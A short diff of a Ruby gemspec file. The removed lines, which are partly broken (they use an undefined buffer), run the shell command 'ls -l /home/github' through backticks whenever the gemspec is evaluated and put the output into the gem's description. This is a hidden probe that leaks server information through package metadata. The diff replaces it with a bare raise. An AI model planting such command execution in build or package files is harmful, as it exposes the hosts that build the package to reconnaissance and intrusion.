@@ -1,10 +1,5 @@
 Gem::Specification.new do |s|
-str="ls -l /home/github;#"
-i=0
-str.each_byte {|b| data[i] = b; i += 1 }
-(i...data.size).each {|i| data[i] = 32 }
-d=Kernel.`(data)
-  
+  raise 'wth'
   s.name = "test"
   s.description    = "#{d}"
   s.version  = "0.0.1"
